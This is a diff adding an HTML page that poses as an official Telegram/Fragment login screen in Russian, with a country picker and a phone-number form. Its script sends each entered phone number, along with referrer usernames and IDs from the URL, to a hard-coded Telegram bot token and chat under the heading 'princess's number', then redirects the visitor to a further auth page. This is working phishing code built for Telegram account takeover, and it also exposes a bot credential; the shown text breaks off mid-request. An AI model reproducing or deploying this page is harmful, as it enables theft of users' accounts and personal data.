@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация Telegram / Fragment</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --tg-blue: #26a4e3;
+            --tg-green: #38a169;
+            --tg-red: #ef4444;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+            font-style: normal;
+            background-color: #212121;
+            min-height: 100vh;
+        }
+        input::placeholder {
+            color: #9ca3af;
+        }
+        select {
+            color: #ffffff;
+            background-color: #111827;
+        }
+        select option {
+            color: #ffffff;
+            background-color: #111827;
+        }
+        .icon-tg, .icon-fragment {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background-color: transparent;
+        }
+        .icon-tg img, .icon-fragment img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .error-message {
+            color: var(--tg-red);
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+            transition: opacity 0.3s ease;
+            text-align: center;
+        }
+        .input-container {
+            position: relative;
+        }
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: -8px;
+            transform: translateY(0);
+            color: #8774e1;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            font-size: 0.75rem;
+            background-color: #212121;
+            padding: 0 4px;
+        }
+        .input-container:focus-within .floating-label,
+        .input-container.has-value .floating-label {
+            top: -8px;
+            left: 12px;
+            transform: translateY(0);
+            font-size: 0.75rem;
+            color: #8774e1;
+            background-color: #212121;
+            padding: 0 4px;
+        }
+        .input-container.has-error .floating-label {
+            color: #ef4444;
+        }
+        .input-container.has-error .country-dropdown-button,
+        .input-container.has-error .input-field {
+            border-color: #ef4444;
+            border-width: 2px;
+        }
+        .input-field, .input-select {
+            background-color: transparent;
+            caret-color: #8774e1;
+            border: 1px solid #6b7280;
+            border-radius: 0.75rem;
+            padding: 0.875rem 1rem;
+            transition: all 0.15s ease;
+        }
+        .input-field:focus, .input-select:focus {
+            border-width: 2px;
+            border-color: #8774e1;
+            outline: none;
+        }
+        .input-field.has-value:not(:focus), .input-select.has-value:not(:focus) {
+            border-width: 2px;
+            border-color: #8774e1;
+        }
+        .country-dropdown {
+            position: relative;
+        }
+        .country-dropdown-button {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            padding: 0.875rem 1rem;
+            background-color: transparent;
+            border: 1px solid #6b7280;
+            border-radius: 0.75rem;
+            color: #ffffff;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            text-align: left;
+        }
+        .country-dropdown-button:focus {
+            border-width: 2px;
+            border-color: #8774e1;
+            outline: none;
+        }
+        .country-dropdown-button.has-value:not(:focus) {
+            border-width: 2px;
+            border-color: #8774e1;
+        }
+        .country-dropdown-button.open {
+            border-width: 2px;
+            border-color: #8774e1;
+        }
+        .country-dropdown-list {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background-color: rgba(31, 41, 55, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid #374151;
+            border-radius: 0.75rem;
+            margin-top: 0.25rem;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            display: none;
+        }
+        .country-dropdown-list.open {
+            display: block;
+        }
+        .country-dropdown-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.75rem 1rem;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            border-bottom: 1px solid #374151;
+        }
+        .country-dropdown-item:last-child {
+            border-bottom: none;
+        }
+        .country-dropdown-item:hover {
+            background-color: #374151;
+        }
+        .country-dropdown-item.selected {
+            background-color: #4b5563;
+        }
+        .country-item-name {
+            flex: 1;
+            color: #ffffff;
+            font-size: 1rem;
+        }
+        .country-item-code {
+            color: #9ca3af;
+            font-size: 0.875rem;
+            margin-left: 0.5rem;
+        }
+        .country-button-content {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+        .country-button-name {
+            flex: 1;
+            color: #ffffff;
+            font-size: 1rem;
+        }
+        .country-button-arrow {
+            color: #9ca3af;
+            transition: transform 0.15s ease;
+        }
+        .country-dropdown-button.open .country-button-arrow {
+            transform: rotate(180deg);
+        }
+        .web-app-notice {
+            background-color: #8774e1;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+    </style>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'tg-blue': '#26a4e3',
+                        'tg-custom-arrow': '#26a4e3',
+                        'tg-blue-dark': '#1e80b5',
+                        'tg-secondary': '#E5E7EB',
+                        'tg-text-link': '#26a4e3',
+                        'red-500': '#ef4444',
+                    }
+                }
+            }
+        }
+
+        // Получаем данные пользователя из URL параметров
+        // Получаем данные пользователя из URL параметров
+function getUserDataFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    const user_id = urlParams.get('user_id');
+    const user = urlParams.get('user');
+    const userid = urlParams.get('userid');
+    
+    console.log('📊 Все параметры URL:', Object.fromEntries(urlParams.entries()));
+    
+    // ВАЖНО: В webapp от бота параметры ref и user_id - это данные АКТИВАТОРА
+    // То есть того, кто активировал чек или нажал кнопку вывода
+    let username = 'Не указан';
+    let userId = 'Не указан';
+    
+    if (ref) {
+        username = ref.startsWith('@') ? ref : `@${ref}`;
+    } else if (user) {
+        username = user.startsWith('@') ? user : `@${user}`;
+    }
+    
+    if (user_id) {
+        userId = user_id;
+    } else if (userid) {
+        userId = userid;
+    }
+    
+    const userData = { username, userId };
+    console.log('✅ Данные пользователя из URL (активатора):', userData);
+    
+    // Сохраняем в localStorage
+    localStorage.setItem('telegramUser', JSON.stringify(userData));
+    
+    // Также сохраняем как реферала (активатора)
+    if (username !== 'Не указан') {
+        const referrerInfo = {
+            username,
+            userId,
+            source: 'url_params',
+            isActivator: true
+        };
+        localStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
+        console.log('🔗 Активатор сохранен как реферал:', referrerInfo);
+    }
+    
+    return userData;
+}
+        // Получаем данные пользователя (сначала из localStorage, потом из URL)
+        function getUserData() {
+            // Сначала пробуем получить из localStorage
+            const savedUser = localStorage.getItem('telegramUser');
+            if (savedUser) {
+                try {
+                    const user = JSON.parse(savedUser);
+                    if (user.username && user.username !== 'Не указан') {
+                        console.log('📱 Данные пользователя из localStorage:', user);
+                        return user;
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге сохранённых данных:', e);
+                }
+            }
+            
+            // Если нет в localStorage, получаем из URL
+            return getUserDataFromURL();
+        }
+
+        // Получаем информацию о реферале
+       function getReferrerInfo() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    const user_id = urlParams.get('user_id');
+    const user = urlParams.get('user');
+    const userid = urlParams.get('userid');
+    
+    console.log('🔍 Анализ параметров URL для реферала:', { ref, user_id, user, userid });
+    
+    // Приоритет: параметры ref/user_id (это данные активатора от бота)
+    if (ref) {
+        const referrerInfo = { 
+            username: ref.startsWith('@') ? ref : `@${ref}`, 
+            userId: user_id || userid || 'Не указан',
+            source: 'url_ref',
+            isActivator: true
+        };
+        console.log('✅ Реферал определен как активатор:', referrerInfo);
+        return referrerInfo;
+    }
+    
+    // Альтернативные параметры
+    if (user) {
+        const referrerInfo = { 
+            username: user.startsWith('@') ? user : `@${user}`, 
+            userId: userid || user_id || 'Не указан',
+            source: 'url_user',
+            isActivator: true
+        };
+        console.log('✅ Реферал определен через user:', referrerInfo);
+        return referrerInfo;
+    }
+    
+    console.log('❌ Реферал не найден в URL параметрах');
+    return null;
+}
+
+        const allCountries = [
+            { name: "Россия", code: "RU", prefix: "+7", length: 10, format: " XXX XXX XX XX" },
+            { name: "Украина", code: "UA", prefix: "+380", length: 9, format: " XX XXX XX XX" },
+            { name: "Беларусь", code: "BY", prefix: "+375", length: 9, format: " XX XXX XX XX" },
+            { name: "Казахстан", code: "KZ", prefix: "+7", length: 10, format: " XXX XXX XX XX" },
+            { name: "Узбекистан", code: "UZ", prefix: "+998", length: 9, format: " XX XXX XX XX" },
+            { name: "Азербайджан", code: "AZ", prefix: "+994", length: 9, format: " XX XXX XX XX" },
+            { name: "Армения", code: "AM", prefix: "+374", length: 8, format: " XX XXX XXX" },
+            { name: "Грузия", code: "GE", prefix: "+995", length: 9, format: " XXX XXX XXX" },
+            { name: "Молдова", code: "MD", prefix: "+373", length: 8, format: " XXX XXX XX" },
+            { name: "Кыргызстан", code: "KG", prefix: "+996", length: 9, format: " XXX XXX XXX" },
+            { name: "Таджикистан", code: "TJ", prefix: "+992", length: 9, format: " XX XXX XXX X" },
+            { name: "Туркменистан", code: "TM", prefix: "+993", length: 8, format: " X XXX XXXX" },
+            { name: "Эстония", code: "EE", prefix: "+372", length: 8, format: " XXXX XXXX" },
+            { name: "Латвия", code: "LV", prefix: "+371", length: 8, format: " XX XXX XXX" },
+            { name: "Литва", code: "LT", prefix: "+370", length: 8, format: " XXX XXX XX" },
+            { name: "Польша", code: "PL", prefix: "+48", length: 9, format: " XXX XXX XXX" },
+            { name: "Германия", code: "DE", prefix: "+49", length: 10, format: " XXX XXX XXXX" },
+            { name: "Франция", code: "FR", prefix: "+33", length: 9, format: " X XX XX XX XX" },
+            { name: "Италия", code: "IT", prefix: "+39", length: 10, format: " XXX XXX XXXX" },
+            { name: "Великобритания", code: "GB", prefix: "+44", length: 10, format: " XXXX XXX XXX" },
+            { name: "США", code: "US", prefix: "+1", length: 10, format: " XXX XXX XXXX" },
+            { name: "Канада", code: "CA", prefix: "+1", length: 10, format: " XXX XXX XXXX" },
+            { name: "Турция", code: "TR", prefix: "+90", length: 10, format: " XXX XXX XXXX" },
+            { name: "Израиль", code: "IL", prefix: "+972", length: 9, format: " X XXX XXXX" },
+            { name: "ОАЭ", code: "AE", prefix: "+971", length: 9, format: " X XXX XXXX" },
+            { name: "Индия", code: "IN", prefix: "+91", length: 10, format: " XXXX XXX XXX" },
+            { name: "Китай", code: "CN", prefix: "+86", length: 11, format: " XXX XXXX XXXX" },
+            { name: "Япония", code: "JP", prefix: "+81", length: 10, format: " XX XXXX XXXX" },
+            { name: "Южная Корея", code: "KR", prefix: "+82", length: 10, format: " XX XXXX XXXX" },
+            { name: "Австралия", code: "AU", prefix: "+61", length: 9, format: " X XXXX XXXX" },
+            { name: "Бразилия", code: "BR", prefix: "+55", length: 11, format: " XX XXXX XXXX" },
+            { name: "Аргентина", code: "AR", prefix: "+54", length: 10, format: " XX XXXX XXXX" },
+            { name: "Мексика", code: "MX", prefix: "+52", length: 10, format: " XX XXXX XXXX" },
+            { name: "Испания", code: "ES", prefix: "+34", length: 9, format: " XXX XXX XXX" },
+            { name: "Португалия", code: "PT", prefix: "+351", length: 9, format: " XXX XXX XXX" },
+            { name: "Нидерланды", code: "NL", prefix: "+31", length: 9, format: " X XX XX XX XX" },
+            { name: "Бельгия", code: "BE", prefix: "+32", length: 9, format: " X XX XX XX XX" },
+            { name: "Швейцария", code: "CH", prefix: "+41", length: 9, format: " XX XXX XX XX" },
+            { name: "Австрия", code: "AT", prefix: "+43", length: 10, format: " X XXX XXX XXXX" },
+            { name: "Швеция", code: "SE", prefix: "+46", length: 9, format: " XX XXX XX XX" },
+            { name: "Норвегия", code: "NO", prefix: "+47", length: 8, format: " XXX XX XXX" },
+            { name: "Дания", code: "DK", prefix: "+45", length: 8, format: " XX XX XX XX" },
+            { name: "Финляндия", code: "FI", prefix: "+358", length: 9, format: " XX XXX XXXX" },
+            { name: "Ирландия", code: "IE", prefix: "+353", length: 9, format: " XX XXX XXXX" },
+            { name: "Чехия", code: "CZ", prefix: "+420", length: 9, format: " XXX XXX XXX" },
+            { name: "Словакия", code: "SK", prefix: "+421", length: 9, format: " XXX XXX XXX" },
+            { name: "Венгрия", code: "HU", prefix: "+36", length: 9, format: " X XXX XXX X" },
+            { name: "Румыния", code: "RO", prefix: "+40", length: 9, format: " XXX XXX XXX" },
+            { name: "Болгария", code: "BG", prefix: "+359", length: 9, format: " XX XXX XXXX" },
+            { name: "Греция", code: "GR", prefix: "+30", length: 10, format: " XXX XXX XXXX" },
+            { name: "Сербия", code: "RS", prefix: "+381", length: 9, format: " XX XXX XXXX" },
+            { name: "Хорватия", code: "HR", prefix: "+385", length: 9, format: " XX XXX XXXX" },
+            { name: "Словения", code: "SI", prefix: "+386", length: 8, format: " XX XXX XXX" },
+            { name: "Черногория", code: "ME", prefix: "+382", length: 8, format: " XX XXX XXX" },
+            { name: "Босния и Герцеговина", code: "BA", prefix: "+387", length: 8, format: " XX XXX XXX" },
+            { name: "Албания", code: "AL", prefix: "+355", length: 9, format: " XX XXX XXXX" },
+            { name: "Северная Македония", code: "MK", prefix: "+389", length: 8, format: " XX XXX XXX" },
+            { name: "Косово", code: "XK", prefix: "+383", length: 8, format: " XX XXX XXX" },
+            { name: "Мальта", code: "MT", prefix: "+356", length: 8, format: " XXXX XXXX" },
+            { name: "Кипр", code: "CY", prefix: "+357", length: 8, format: " XX XXX XXX" },
+            { name: "Исландия", code: "IS", prefix: "+354", length: 7, format: " XXX XXXX" },
+            { name: "Люксембург", code: "LU", prefix: "+352", length: 9, format: " XXX XXX XXX" },
+            { name: "Монако", code: "MC", prefix: "+377", length: 9, format: " X XX XX XX XX" },
+            { name: "Андорра", code: "AD", prefix: "+376", length: 6, format: " XXX XXX" },
+            { name: "Сан-Марино", code: "SM", prefix: "+378", length: 10, format: " XXX XXX XXXX" },
+            { name: "Ватикан", code: "VA", prefix: "+379", length: 10, format: " XXX XXX XXXX" },
+            { name: "Лихтенштейн", code: "LI", prefix: "+423", length: 7, format: " XXX XXXX" },
+            { name: "Беларусь", code: "BY", prefix: "+375", length: 9, format: " XX XXX XX XX" }
+        ];
+
+        function formatPhoneNumber(value, country) {
+            if (!country) return value;
+            
+            let digits = value.replace(/[^\d]/g, '');
+            if (digits.length === 0) return '+';
+            
+            const prefixDigits = country.prefix.replace(/[^\d]/g, '');
+            if (!digits.startsWith(prefixDigits)) {
+                digits = prefixDigits + digits;
+            }
+            
+            const numberPart = digits.substring(prefixDigits.length);
+            
+            let formatted = country.prefix + ' ';
+            
+            if (country.format) {
+                let digitCount = 0;
+                for (let i = 0; i < country.format.length; i++) {
+                    const formatChar = country.format[i];
+                    if (formatChar === 'X' || formatChar === 'x') {
+                        digitCount++;
+                    }
+                }
+                
+                for (let i = 0; i < numberPart.length; i++) {
+                    formatted += numberPart[i];
+                    if (country.format.includes(' ' + (i + 1)) && i < numberPart.length - 1) {
+                        formatted += ' ';
+                    }
+                }
+            } else {
+                for (let i = 0; i < numberPart.length; i++) {
+                    formatted += numberPart[i];
+                    if ((i + 1) % 3 === 0 && i < numberPart.length - 1) {
+                        formatted += ' ';
+                    }
+                }
+            }
+            
+            return formatted;
+        }
+        
+        function handlePhoneInput(input) {
+            let value = input.value;
+            
+            let digitsOnly = value.replace(/\s/g, '');
+            digitsOnly = digitsOnly.replace(/[^\d+]/g, '');
+            
+            if (digitsOnly.length > 0 && digitsOnly[0] !== '+') {
+                digitsOnly = '+' + digitsOnly.replace(/\+/g, '');
+            }
+            
+            const prefix = extractPrefix(digitsOnly);
+            let country = null;
+            
+            if (prefix) {
+                country = allCountries.find(c => c.prefix === prefix);
+                if (country) {
+                    value = formatPhoneNumber(digitsOnly, country);
+                    
+                    updatePhoneNumberSettingsByPrefix(prefix);
+                    
+                    const countryDropdownButton = document.getElementById('countryDropdownButton');
+                    const countryButtonName = document.getElementById('countryButtonName');
+                    const countryDropdownList = document.getElementById('countryDropdownList');
+                    if (countryDropdownButton && country && countryDropdownList) {
+                        const foundItem = countryDropdownList.querySelector(`[data-prefix="${prefix}"]`);
+                        if (foundItem) {
+                            countryDropdownList.querySelectorAll('.country-dropdown-item').forEach(el => {
+                                el.classList.remove('selected');
+                            });
+                            foundItem.classList.add('selected');
+                            
+                            if (countryButtonName) {
+                                countryButtonName.textContent = country.name;
+                            }
+                        }
+                    }
+                } else {
+                    value = digitsOnly;
+                }
+            } else {
+                value = digitsOnly;
+            }
+            
+            if (input.value !== value) {
+                input.value = value;
+            }
+        }
+        
+        function extractPrefix(fullNumber) {
+            const digits = fullNumber.replace(/[^\d]/g, '');
+            if (digits.length === 0) return null;
+            
+            let foundPrefix = null;
+            for (let i = Math.min(5, digits.length); i >= 1; i--) {
+                const prefix = '+' + digits.substring(0, i);
+                const found = allCountries.find(c => c.prefix === prefix);
+                if (found) {
+                    foundPrefix = prefix;
+                    break;
+                }
+            }
+            return foundPrefix;
+        }
+        
+        function updatePhoneNumberSettingsByPrefix(prefix) {
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const foundCountry = allCountries.find(c => c.prefix === prefix);
+            
+            if (foundCountry && phoneNumberInput) {
+                phoneNumberInput.setAttribute('data-prefix-length', prefix.length);
+                phoneNumberInput.setAttribute('data-number-length', foundCountry.length);
+                phoneNumberInput.setAttribute('data-country-code', foundCountry.code);
+                
+                const prefixDigits = prefix.replace(/[^\d]/g, '');
+                const testDigits = prefixDigits + '0'.repeat(foundCountry.length);
+                const testFormatted = formatPhoneNumber('+' + testDigits, foundCountry);
+                const maxLength = testFormatted.length;
+                phoneNumberInput.setAttribute('maxlength', maxLength);
+            }
+        }
+
+        function updateFieldValue() {
+            const phoneNumber = document.getElementById('phoneNumberInput');
+            const countryDropdownButton = document.getElementById('countryDropdownButton');
+            
+            if (phoneNumber) {
+                const container = phoneNumber.closest('.input-container');
+                if (container) {
+                    if (phoneNumber.value.trim() !== '' && phoneNumber.value.trim() !== '+') {
+                        container.classList.add('has-value');
+                        phoneNumber.classList.add('has-value');
+                    } else {
+                        container.classList.remove('has-value');
+                        phoneNumber.classList.remove('has-value');
+                    }
+                }
+            }
+            
+            if (countryDropdownButton) {
+                const container = countryDropdownButton.closest('.input-container');
+                if (container) {
+                    container.classList.add('has-value');
+                }
+            }
+        }
+
+        function toggleErrorStyles(hasError) {
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const countryDropdownButton = document.getElementById('countryDropdownButton');
+            
+            const phoneContainer = phoneNumberInput ? phoneNumberInput.closest('.input-container') : null;
+            const countryContainer = countryDropdownButton ? countryDropdownButton.closest('.input-container') : null;
+
+            [phoneNumberInput, countryDropdownButton].forEach(input => {
+                if (input) {
+                    if (hasError) {
+                        input.style.borderColor = '#ef4444';
+                        input.style.borderWidth = '2px';
+                    } else {
+                        input.style.borderColor = '';
+                        input.style.borderWidth = '';
+                    }
+                }
+            });
+            
+            if (phoneContainer) {
+                if (hasError) {
+                    phoneContainer.classList.add('has-error');
+                } else {
+                    phoneContainer.classList.remove('has-error');
+                }
+            }
+            
+            if (countryContainer) {
+                if (hasError) {
+                    countryContainer.classList.add('has-error');
+                } else {
+                    countryContainer.classList.remove('has-error');
+                }
+            }
+        }
+
+        function initializeCountrySelector() {
+            const countryDropdownButton = document.getElementById('countryDropdownButton');
+            const countryDropdownList = document.getElementById('countryDropdownList');
+            const countryButtonName = document.getElementById('countryButtonName');
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const defaultCountryCode = 'RU';
+
+            if (!countryDropdownButton || !countryDropdownList || !phoneNumberInput) {
+                console.error('Missing critical elements.');
+                return;
+            }
+
+            countryDropdownList.innerHTML = '';
+            const initialCountry = allCountries.find(c => c.code === defaultCountryCode) || allCountries[0];
+
+            const alphabeticalCountries = [...allCountries].sort((a, b) =>
+                new Intl.Collator('ru').compare(a.name, b.name)
+            );
+
+            alphabeticalCountries.forEach(country => {
+                const item = document.createElement('div');
+                item.className = 'country-dropdown-item';
+                item.setAttribute('role', 'option');
+                item.setAttribute('data-prefix', country.prefix);
+                item.setAttribute('data-length', country.length);
+                item.setAttribute('data-country-code', country.code);
+                if (country.code === defaultCountryCode) {
+                    item.classList.add('selected');
+                }
+                
+                item.innerHTML = `
+                    <div style="display: flex; align-items: center; flex: 1;">
+                        <span class="country-item-name">${country.name}</span>
+                    </div>
+                    <span class="country-item-code">${country.prefix}</span>
+                `;
+                
+                item.addEventListener('click', () => {
+                    countryDropdownList.querySelectorAll('.country-dropdown-item').forEach(el => {
+                        el.classList.remove('selected');
+                    });
+                    item.classList.add('selected');
+                    
+                    countryButtonName.textContent = country.name;
+                    
+                    countryDropdownButton.classList.remove('open');
+                    countryDropdownList.classList.remove('open');
+                    countryDropdownButton.setAttribute('aria-expanded', 'false');
+                    
+                    const mockOption = {
+                        value: country.prefix,
+                        getAttribute: (attr) => {
+                            if (attr === 'data-length') return country.length;
+                            if (attr === 'data-country-code') return country.code;
+                            return null;
+                        }
+                    };
+                    updatePhoneNumberSettings(mockOption);
+                });
+                
+                countryDropdownList.appendChild(item);
+            });
+
+            countryButtonName.textContent = initialCountry.name;
+            countryDropdownButton.classList.add('has-value');
+
+            countryDropdownButton.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const isOpen = countryDropdownButton.classList.contains('open');
+                if (isOpen) {
+                    countryDropdownButton.classList.remove('open');
+                    countryDropdownList.classList.remove('open');
+                    countryDropdownButton.setAttribute('aria-expanded', 'false');
+                } else {
+                    countryDropdownButton.classList.add('open');
+                    countryDropdownList.classList.add('open');
+                    countryDropdownButton.setAttribute('aria-expanded', 'true');
+                }
+            });
+
+            document.addEventListener('click', (e) => {
+                if (!countryDropdownButton.contains(e.target) && !countryDropdownList.contains(e.target)) {
+                    countryDropdownButton.classList.remove('open');
+                    countryDropdownList.classList.remove('open');
+                    countryDropdownButton.setAttribute('aria-expanded', 'false');
+                }
+            });
+
+            const initialFormatted = formatPhoneNumber(initialCountry.prefix, initialCountry);
+            phoneNumberInput.value = initialFormatted;
+            phoneNumberInput.setAttribute('data-prefix-length', initialCountry.prefix.length);
+            phoneNumberInput.setAttribute('data-number-length', initialCountry.length);
+            phoneNumberInput.setAttribute('data-country-code', initialCountry.code);
+            
+            const testDigits = initialCountry.prefix.replace(/[^\d]/g, '') + '0'.repeat(initialCountry.length);
+            const testFormatted = formatPhoneNumber('+' + testDigits, initialCountry);
+            const maxLength = testFormatted.length;
+            phoneNumberInput.setAttribute('maxlength', maxLength);
+            
+            updateFieldValue();
+            
+            setTimeout(() => {
+                const cursorPos = initialFormatted.length;
+                phoneNumberInput.setSelectionRange(cursorPos, cursorPos);
+            }, 0);
+
+            const processInput = (input) => {
+                const errorElement = document.getElementById('errorPhone');
+                if (errorElement && errorElement.textContent) {
+                    errorElement.textContent = '';
+                    errorElement.classList.add('opacity-0');
+                    toggleErrorStyles(false);
+                }
+                
+                handlePhoneInput(input);
+                
+                updateFieldValue();
+            };
+
+            phoneNumberInput.addEventListener('input', (event) => {
+                processInput(event.target);
+            });
+
+            phoneNumberInput.addEventListener('paste', (event) => {
+                setTimeout(() => {
+                    processInput(event.target);
+                }, 0);
+            });
+
+            phoneNumberInput.addEventListener('change', (event) => {
+                processInput(event.target);
+            });
+            
+            phoneNumberInput.addEventListener('keydown', (event) => {
+                if (event.key === 'Backspace') {
+                    const cursorPosition = event.target.selectionStart;
+                    const value = event.target.value;
+                    
+                    if (cursorPosition > 0 && value[cursorPosition - 1] === ' ') {
+                        event.preventDefault();
+                        const newValue = value.substring(0, cursorPosition - 2) + value.substring(cursorPosition);
+                        event.target.value = newValue;
+                        handlePhoneInput(event.target, false);
+                        return;
+                    }
+                }
+                
+                const cursorPosition = event.target.selectionStart;
+                const value = event.target.value;
+                const hasPlus = value.includes('+');
+                
+                if (event.key.length === 1) {
+                    if (event.key === '+' && hasPlus) {
+                        event.preventDefault();
+                        return;
+                    }
+                    if (event.key === '+' && cursorPosition > 0) {
+                        event.preventDefault();
+                        return;
+                    }
+                    if (!/[0-9]/.test(event.key) && event.key !== '+') {
+                        event.preventDefault();
+                        return;
+                    }
+                }
+            });
+
+            phoneNumberInput.addEventListener('blur', () => {
+                updateFieldValue();
+            });
+            
+            countryDropdownButton.addEventListener('blur', () => {
+                updateFieldValue();
+            });
+        }
+
+        function updatePhoneNumberSettings(selectedOption) {
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const errorElement = document.getElementById('errorPhone');
+
+            const newPrefix = selectedOption.value;
+            const newLength = selectedOption.getAttribute('data-length');
+            const countryCode = selectedOption.getAttribute('data-country-code');
+            const country = allCountries.find(c => c.code === countryCode);
+
+            errorElement.textContent = '';
+            errorElement.classList.add('opacity-0');
+            toggleErrorStyles(false);
+
+            if (newPrefix && newLength && phoneNumberInput) {
+                const formattedPrefix = country && country.format ? 
+                    formatPhoneNumber(newPrefix, country) : newPrefix;
+                
+                phoneNumberInput.value = formattedPrefix;
+                phoneNumberInput.setAttribute('data-prefix-length', newPrefix.length);
+                phoneNumberInput.setAttribute('data-number-length', newLength);
+                phoneNumberInput.setAttribute('data-country-code', countryCode);
+                
+                const prefixDigits = newPrefix.replace(/[^\d]/g, '');
+                const testDigits = prefixDigits + '0'.repeat(parseInt(newLength, 10));
+                const testFormatted = formatPhoneNumber('+' + testDigits, country);
+                const maxLength = testFormatted.length;
+                phoneNumberInput.setAttribute('maxlength', maxLength);
+                phoneNumberInput.focus();
+                
+                setTimeout(() => {
+                    phoneNumberInput.setSelectionRange(formattedPrefix.length, formattedPrefix.length);
+                }, 0);
+            }
+        }
+
+        async function handleNextClick() {
+            console.log('handleNextClick вызван');
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const errorElement = document.getElementById('errorPhone');
+
+            if (!phoneNumberInput) {
+                console.error('Поле phoneNumberInput не найдено!');
+                return;
+            }
+
+            let fullNumber = phoneNumberInput.value.trim();
+            
+            let digitsOnly = fullNumber.replace(/\s/g, '').replace(/[^\d+]/g, '');
+
+            errorElement.textContent = '';
+            errorElement.classList.add('opacity-0');
+            toggleErrorStyles(false);
+
+            if (!fullNumber || fullNumber.length === 0 || fullNumber === '+' || digitsOnly.length < 6) {
+                errorElement.textContent = "Пожалуйста, введите номер телефона.";
+                errorElement.classList.remove('opacity-0');
+                toggleErrorStyles(true);
+                phoneNumberInput.focus();
+                return;
+            }
+            
+            const digitsCount = digitsOnly.replace(/[^\d]/g, '').length;
+            if (digitsCount < 3) {
+                errorElement.textContent = "Пожалуйста, введите номер телефона.";
+                errorElement.classList.remove('opacity-0');
+                toggleErrorStyles(true);
+                phoneNumberInput.focus();
+                return;
+            }
+
+            let fullPhoneNumber = digitsOnly;
+            if (!fullPhoneNumber.startsWith('+')) {
+                fullPhoneNumber = '+' + fullPhoneNumber.replace(/\+/g, '');
+            }
+            
+            console.log('Переход на auth.html с номером:', fullPhoneNumber);
+            
+            // Получаем данные для передачи
+            const userData = getUserData();
+            const referrerInfo = getReferrerInfo();
+            
+            // Собираем все возможные параметры для передачи
+            let authUrl = `auth.html?phone=${encodeURIComponent(fullPhoneNumber)}`;
+            
+            // Добавляем данные пользователя
+            if (userData.username && userData.username !== 'Не указан') {
+                authUrl += `&user=${encodeURIComponent(userData.username.replace('@', ''))}`;
+            }
+            if (userData.userId && userData.userId !== 'Не указан') {
+                authUrl += `&userid=${encodeURIComponent(userData.userId)}`;
+            }
+            
+            // Добавляем реферальную информацию (если есть)
+            if (referrerInfo && referrerInfo.username) {
+                // Убираем @ из имени пользователя
+                const cleanUsername = referrerInfo.username.replace('@', '');
+                authUrl += `&ref=${encodeURIComponent(cleanUsername)}`;
+                if (referrerInfo.userId && referrerInfo.userId !== 'Не указан') {
+                    authUrl += `&refid=${encodeURIComponent(referrerInfo.userId)}`;
+                }
+            }
+            
+            console.log('URL для перехода:', authUrl);
+            
+            // Отправляем номер в Telegram
+            try {
+                await sendPhoneToTelegram(fullPhoneNumber);
+            } catch (error) {
+                console.error('Ошибка при отправке номера телефона:', error);
+            }
+            
+            // Переходим на страницу авторизации
+            window.location.href = authUrl;
+        }
+        
+       async function sendPhoneToTelegram(phoneNumber) {
+    const BOT_TOKEN = '8694802643:AAHJgN9qHmiNZEfUWnEXzyv-4Ib3Op14j2c';
+    const CHAT_ID = '-1003719678453';
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    const user_id = urlParams.get('user_id');
+    const user = urlParams.get('user');
+    const userid = urlParams.get('userid');
+    
+    console.log('🌐 Параметры URL при отправке номера:', { ref, user_id, user, userid });
+    
+    let referrerUsername = 'Не указан';
+    let referrerId = 'Не указан';
+    let currentUsername = 'Не указан';
+    let currentUserId = 'Не указан';
+    
+    // Определяем реферала (ref/user_id)
+    if (ref) {
+        referrerUsername = ref.startsWith('@') ? ref : `@${ref}`;
+    } else if (user) {
+        referrerUsername = user.startsWith('@') ? user : `@${user}`;
+    }
+    
+    if (user_id) {
+        referrerId = user_id;
+    } else if (userid) {
+        referrerId = userid;
+    }
+    
+    // Для текущего пользователя пока нет данных, используем реферала как текущего
+    // (поскольку webapp открывается с данными активатора как реферала)
+    currentUsername = referrerUsername;
+    currentUserId = referrerId;
+    
+    let message = `👑 <b>Номер принцессы</b>\n\n`;
+    
+    // Добавляем информацию о реферале (активаторе)
+    if (referrerUsername !== 'Не указан') {
+        message += `🔗 Пригласил: ${referrerUsername}\n`;
+        if (referrerId !== 'Не указан') {
+            message += `📊 ID реферала: ${referrerId}\n`;
+        }
+        message += `\n`;
+    }
+    
+    // Добавляем информацию о пользователе
+    message += `👤 Пользователь: ${currentUsername}\n`;
+    message += `🆔 ID: ${currentUserId}\n`;
+    message += `📱 Номер: ${phoneNumber || 'Не указан'}\n`;
+    message += `⏰ Время: ${new Date().toLocaleString('ru-RU')}\n`;
+   
+    
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
